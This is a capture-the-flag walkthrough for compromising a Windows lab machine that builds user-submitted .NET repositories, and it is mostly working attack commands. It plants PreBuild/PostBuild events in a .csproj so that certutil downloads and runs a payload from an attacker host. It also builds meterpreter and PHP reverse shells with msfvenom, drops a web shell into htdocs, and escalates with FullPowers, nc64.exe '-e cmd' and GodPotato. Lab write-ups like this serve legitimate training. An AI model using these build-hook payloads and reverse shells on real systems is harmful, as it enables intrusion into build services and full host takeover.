#Enumeration

Nmap scan show open port on 80 which reveals a website. Check nmap-scan.html

# Foothold

The Website offers a service to build .net repos. We can exploit this by using some BuildEvents and getting a shell.

## Creating a Repo(must have a .sln file for .net)

dotnet new sln -o Visual
cd Visual
dotnet new console -o Visual.ConsoleApp --framework net6.0
dotnet sln Visual.sln add Visual.ConsoleApp/Visual.ConsoleApp.csproj

HelloWorld.cs
```

// Hello World! program
namespace HelloWorld
{
    class Hello {         
        static void Main(string[] args)
        {
            System.Console.WriteLine("Hello World!");
        }
    }
}
```

Add this line to Visual.ConsoleApp.csproj and of course use your IP/PORT of the webserver we are setting up next
```
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="certutil -urlcache -f http://IP:PORT/shell.exe %temp%/shell.exe" />
</Target>

<Target Name="PostBuild" AfterTargets="PostBuildEvent">
  <Exec Command="start %temp%/shell.exe" />
</Target>
```

## Creating shell.exe 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > s.exe
```

## Staring reverse shell
```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport PORT //used at creating shell
set lport IP
run -j
```

## Staring Webserver for shell-download
```
python3 -m http.server PORT
```

## Start Gitea
```
sudo podman pull docker.io/gitea/gitea
mkdir data
sudo podman run --rm -it -v ./data:/data -p 3000:3000 gitea/gitea
```
visit localhost:3000 and do the initial process. Then add a user and upload the repository we have created.

## Getting shell
enter the site to your repo on the website:
http://IP:3000/username/Visual

On the python webserver you can watch how the shell.exe get downloaded and afterwards a session in msfconsole started. Another method is to use a payload which started a connection via powershell/cmd.

# Privilege Escalation
This shell was closed after one command on msfconsole so I used nc.

## Getting another shell
We are allowed to create file in C:\xampp\htdocs so let use this to get shell

### Creating & Upload Payload
msfvenom -p php/reverse_tcp LHOST=IP LPORT=PORT -f raw > phpraw.php

upload it via our first shell:
```
cerutil -urlcache -f http://IP:PORT/phpraw.php phpraw.php
```
### Starting NC listener
```
nc -nlvp PORT 
```

### Trigger Shell
Start the shell by visiting http://10.10.11.234/phpraw.php

## Extend Privileges using FullPowers
I need to do another workaround here by uploading nc64.exe and creating another shell.

Upload FullPowers from this repo: https://github.com/itm4n/FullPowers

Upload nc64.exe available at this repo: https://github.com/int0x33/nc.exe/

### Start nc listener
nc -nlvp PORT

### Execute FullPower to gain another shell with more privileges
```
FullPowers -c "C:\xampp\htdocs\nc64.exe IP PORT -e cmd" -z
```

With the new shell you should have 7 Privileges when you execute whoami /priv instead of 3.

## Getting Root using GodPotato
Download and upload GodPotato-NET4.exe from this url https://github.com/BeichenDream/GodPotato/releases

### Creating shell and upload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shellroot.exe
```

Upload it to the server.

### Start Listener

start the listener in msfconsole like at the beginning but using another port this time.
```
set payload windows/x64/meterpreter/reverse_tcp
set lport PORT //used at creating shell one step before
```

### Start shell using GodPotato
```
GodPotato-NET4.exe -cmd "C:\xampp\htdocs\uploads\shellroot.exe"
```

